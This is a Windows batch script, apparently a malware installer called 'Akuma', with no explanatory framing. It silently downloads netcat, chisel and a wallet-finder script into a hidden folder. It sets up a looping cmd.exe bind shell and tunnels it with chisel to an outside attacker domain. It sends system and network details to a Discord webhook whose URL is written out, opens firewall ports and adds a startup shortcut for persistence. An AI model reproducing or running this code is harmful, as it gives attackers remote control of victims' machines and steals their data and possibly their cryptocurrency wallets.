@echo off
rmdir /s /q %homedrive%\ShiniGami
rmdir /s /q %userprofile%\Akuma
mkdir %userprofile%\Akuma
attrib +h %userprofile%\Akuma
mkdir %userprofile%\Akuma\nc
%homedrive%
curl -L https://github.com/l-urk/Akuma/raw/main/Utilities/nc.exe > %userprofile%\Akuma\nc\nc.exe
curl -L https://github.com/l-urk/Akuma/raw/main/dll/libcrypto-3.dll > %userprofile%\Akuma\nc\libcrypto-3.dll
curl -L https://github.com/l-urk/Akuma/raw/main/Utilities/chisel.exe > %userprofile%\Akuma\chisel.exe
curl -L https://raw.githubusercontent.com/l-urk/Wallet-Finder/main/WalletFinder.bat > %userprofile%\Akuma\WalletFinder.bat
cd %userprofile%\Akuma
echo del %userprofile%\Akuma\systeminfo.txt >> %userprofile%\Akuma\zonbi.bat
echo systeminfo ^>^> %userprofile%\Akuma\systeminfo.txt >> %userprofile%\Akuma\zonbi.bat
echo ipconfig /all ^>^> %userprofile%\Akuma\systeminfo.txt >> %userprofile%\Akuma\zonbi.bat
echo curl -X POST -H "Content-Type: multipart/form-data" -F "file=@%userprofile%\Akuma\systeminfo.txt" -F "content=zombi" https://discord.com/api/webhooks/1169439326988411011/KfTclOjQxXCRVbxZtpmyiePMZvF6CpqrFzAXj7-XFQukq_ZrSEa_zT4dfw3mWdwGWfGy >> %userprofile%\Akuma\zonbi.bat
echo :loop >> %userprofile%\Akuma\nc.bat
echo %userprofile%\Akuma\nc\nc.exe -lvp 32100 -e cmd.exe >> %userprofile%\Akuma\nc.bat
echo goto loop >> %userprofile%\Akuma\nc.bat
echo :loop >> %userprofile%\Akuma\chisel.bat
echo %userprofile%\Akuma\chisel.exe client akuma.4kum4n0d3z3r0.xyz:32101 R:%random%:localhost:32100 >> %userprofile%\Akuma\chisel.bat
echo goto loop >> %userprofile%\Akuma\chisel.bat
echo netsh advfirewall firewall delete rule name=".akuma" >> %userprofile%\Akuma\network.bat
echo netsh advfirewall firewall add rule name=".akuma" dir=in action=allow protocol=TCP localport=32100-32110 >> %userprofile%\Akuma\network.bat
echo netsh advfirewall firewall add rule name=".akuma" dir=out action=allow protocol=TCP localport=32100-32110 >> %userprofile%\Akuma\network.bat
echo Set objShell = CreateObject("WScript.Shell") >> %userprofile%\Akuma\Akuma.vbs
echo objShell.Run "%userprofile%\Akuma\nc.bat", 0, False >> %userprofile%\Akuma\Akuma.vbs
echo objShell.Run "%userprofile%\Akuma\chisel.bat", 0, False >> %userprofile%\Akuma\Akuma.vbs
echo objShell.Run "%userprofile%\Akuma\zonbi.bat", 0, False >> %userprofile%\Akuma\Akuma.vbs
echo objShell.Run "%userprofile%\Akuma\network.bat", 0, False >> %userprofile%\Akuma\Akuma.vbs
echo objShell.Run "%userprofile%\Akuma\WalletFinder.bat", 0, False >> %userprofile%\Akuma\Akuma.vbs
echo y| del "%Appdata%\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\BeyondBirthday.lnk"
echo y| del "%Appdata%\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\Akuma.lnk"
powershell "$s=(New-Object -COM WScript.Shell).CreateShortcut('%AppData%\Start Menu\Programs\Startup\Akuma.lnk');$s.TargetPath='%userprofile%\Akuma\Akuma.vbs';$s.Save()"
start %userprofile%\Akuma\Akuma.vbs
rmdir /s /q %userprofile%\ShiniGami
exit
